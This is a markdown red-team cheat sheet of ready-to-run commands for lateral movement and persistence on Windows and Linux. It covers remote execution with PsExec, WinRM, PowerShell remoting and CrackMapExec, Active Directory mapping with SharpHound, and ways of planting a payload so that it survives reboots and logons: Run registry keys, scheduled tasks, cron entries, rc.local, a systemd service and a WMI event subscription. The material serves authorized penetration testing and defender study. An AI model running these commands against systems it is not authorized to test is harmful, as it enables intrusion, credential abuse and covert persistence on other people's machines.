# Lateral Movement and Persistence Cheat Sheets 🕵️‍♀️

### Purpose
These cheat sheets provide quick access to common techniques, tools, and commands for lateral movement and persistence on Windows and Linux systems. They are valuable for penetration testers and red team operators looking to understand and simulate adversary tactics.

---

## 📖 Table of Contents

1. [Lateral Movement Cheat Sheet](#lateral-movement-cheat-sheet)
2. [Persistence Techniques Cheat Sheet](#persistence-techniques-cheat-sheet)

---

## 1. Lateral Movement Cheat Sheet

### 🛠 Common Tools for Remote Command Execution

1. **PsExec** (Windows):
   - PsExec is part of the Sysinternals suite and allows remote command execution on Windows.
   - **Basic Usage**:
     ```powershell
     psexec \\<target_ip> -u <username> -p <password> cmd
     ```
   - **Running as SYSTEM**:
     ```powershell
     psexec -s \\<target_ip> cmd
     ```

2. **WinRM (Windows Remote Management)**:
   - WinRM is commonly used for remote PowerShell sessions.
   - **Enable WinRM**:
     ```powershell
     winrm quickconfig
     ```
   - **Open a Remote PowerShell Session**:
     ```powershell
     Enter-PSSession -ComputerName <target_ip> -Credential <username>
     ```

3. **Remote Desktop Protocol (RDP)**:
   - RDP allows remote GUI access to Windows systems.
   - **Enable RDP**:
     ```powershell
     Set-ItemProperty -Path 'HKLM:\System\CurrentControlSet\Control\Terminal Server' -Name "fDenyTSConnections" -Value 0
     ```

4. **SSH (Linux and Windows)**:
   - SSH is a standard protocol for remote access on Linux and can be enabled on Windows.
   - **Command**:
     ```bash
     ssh <username>@<target_ip>
     ```

### 🧰 PowerShell Remoting Commands

1. **Invoke-Command**:
   - Run commands on a remote machine over WinRM.
   ```powershell
   Invoke-Command -ComputerName <target_ip> -Credential <username> -ScriptBlock { <command> }
   ```

2. **Copy Files via PowerShell Remoting**:
   - Use `Copy-Item` to transfer files between systems.
   ```powershell
   Copy-Item -Path C:\localfile.txt -Destination \\<target_ip>\C$\Users\Public\ -Credential <username>
   ```

3. **Establish a Persistent Session**:
   - Use `New-PSSession` for long-lived sessions that can run multiple commands.
   ```powershell
   $session = New-PSSession -ComputerName <target_ip> -Credential <username>
   Invoke-Command -Session $session -ScriptBlock { <command> }
   ```

### 🔍 Techniques for Using CrackMapExec and BloodHound

1. **CrackMapExec (CME)**:
   - CrackMapExec is a versatile tool for Active Directory reconnaissance and remote command execution.
   - **Enumerate Shares**:
     ```bash
     crackmapexec smb <target_ip> -u <username> -p <password> --shares
     ```
   - **Check for Local Admin Privileges**:
     ```bash
     crackmapexec smb <target_ip> -u <username> -p <password> --local-auth
     ```
   - **Execute Commands Remotely**:
     ```bash
     crackmapexec smb <target_ip> -u <username> -p <password> -x "whoami"
     ```

2. **BloodHound**:
   - BloodHound is used to map and analyze relationships in Active Directory, revealing paths for privilege escalation and lateral movement.
   - **Collect Data with SharpHound**:
     - SharpHound is the BloodHound data collector and can be run on the target network.
     ```powershell
     .\SharpHound.exe -c All
     ```
   - **Upload to BloodHound**:
     - Import the `.zip` output from SharpHound into BloodHound for analysis and visualization.

---

## 2. Persistence Techniques Cheat Sheet

### 🔒 Windows Registry Persistence Commands

- **Run Key Persistence (User-Specific)**:
  - Adds an entry to the `HKCU` (Current User) `Run` key to execute a payload on user logon.
  ```powershell
  reg add HKCU\Software\Microsoft\Windows\CurrentVersion\Run /v <key_name> /t REG_SZ /d "C:\path\to\payload.exe" /f
  ```

- **Run Key Persistence (Machine-Wide)**:
  - Adds an entry to the `HKLM` (Local Machine) `Run` key to execute a payload on any user logon.
  ```powershell
  reg add HKLM\Software\Microsoft\Windows\CurrentVersion\Run /v <key_name> /t REG_SZ /d "C:\path\to\payload.exe" /f
  ```

- **Registry-Based Scheduled Task Persistence**:
  - Adds a scheduled task entry to run at a set time or interval.
  ```powershell
  reg add HKLM\Software\Microsoft\Windows NT\CurrentVersion\Schedule\TaskCache\Tasks\{<GUID>} /v Path /t REG_SZ /d "C:\path\to\payload.exe" /f
  ```

### ⏰ Windows Scheduled Task Creation Commands

- **Create a Scheduled Task with schtasks**:
  - Run a command or payload at specified intervals (e.g., at logon or daily).
  ```powershell
  schtasks /create /sc onlogon /tn "<task_name>" /tr "C:\path\to\payload.exe" /ru SYSTEM
  ```

- **Set a Daily Trigger for the Task**:
  ```powershell
  schtasks /create /sc daily /tn "<task_name>" /tr "C:\path\to\payload.exe" /st 12:00
  ```

- **List All Scheduled Tasks**:
  ```powershell
  schtasks /query /fo LIST /v
  ```

- **Delete a Scheduled Task**:
  ```powershell
  schtasks /delete /tn "<task_name>" /f
  ```

### 🔄 Linux Cron Job Persistence Examples

1. **User-Specific Cron Job**:
   - Add a cron job to the current user’s crontab to execute a payload at regular intervals.
   ```bash
   (crontab -l 2>/dev/null; echo "@reboot /path/to/payload") | crontab -
   ```

2. **System-Wide Cron Job**:
   - Add a cron job for all users by editing `/etc/crontab`.
   ```bash
   echo "@reboot root /path/to/payload" >> /etc/crontab
   ```

3. **Scheduled Cron Job**:
   - Schedule a command to run every hour.
   ```bash
   echo "0 * * * * /path/to/payload" | crontab -
   ```

4. **Persistent Cron Job via Script in `/etc/cron.d/`**:
   - Place a script file in `/etc/cron.d/` with specified permissions to execute the payload.
   ```bash
   echo "* * * * * root /path/to/payload" > /etc/cron.d/persistent_task
   chmod 644 /etc/cron.d/persistent_task
   ```

### 🛠 Additional Persistence Techniques

1. **Linux Init Scripts**:
   - Modify existing init scripts or create a new one in `/etc/init.d/` to run on system startup.
   ```bash
   echo "/path/to/payload" >> /etc/rc.local
   ```

2. **Systemd Service Persistence (Linux)**:
   - Create a custom service file to run a payload as a background service.
   ```bash
   echo -e "[Unit]\nDescription=CustomService\n\n[Service]\nExecStart=/path/to/payload\n\n[Install]\nWantedBy=multi-user.target" > /etc/systemd/system/customservice.service
   systemctl enable customservice
   ```

3. **Windows WMI Event Subscription**:
   - Use Windows Management Instrumentation (WMI) to create an event-based persistence mechanism.
   ```powershell
   $filter = New-CimInstance -Namespace root\subscription -ClassName __EventFilter -Property @{Name="PersistenceFilter";QueryLanguage="WQL";EventNamespace="root\cimv2";Query="SELECT * FROM __InstanceModificationEvent WITHIN 60 WHERE TargetInstance ISA 'Win32_LocalTime' AND TargetInstance.Hour = 10 AND TargetInstance.Minute = 0"}
   $consumer = New-CimInstance -Namespace root\subscription -ClassName CommandLineEventConsumer -Property @{Name="PersistenceConsumer";CommandLineTemplate="C:\path\to\payload.exe"}
   $binding = New-CimInstance -Namespace root\subscription -ClassName __FilterToConsumerBinding -Property @{Filter=$filter;Consumer=$consumer}
   ```

---

### 📘 Resources

- **CrackMapExec Documentation**: [CrackMapExec GitHub](https://github.com/byt3bl33d3r/CrackMapExec)
- **BloodHound Documentation**: [BloodHound Wiki](https://github.com/BloodHoundAD/BloodHound/wiki)
- **PayloadsAllTheThings**: [Persistence Techniques](https://github.com/swisskyrepo/PayloadsAllTheThings/tree/master/Persistence)
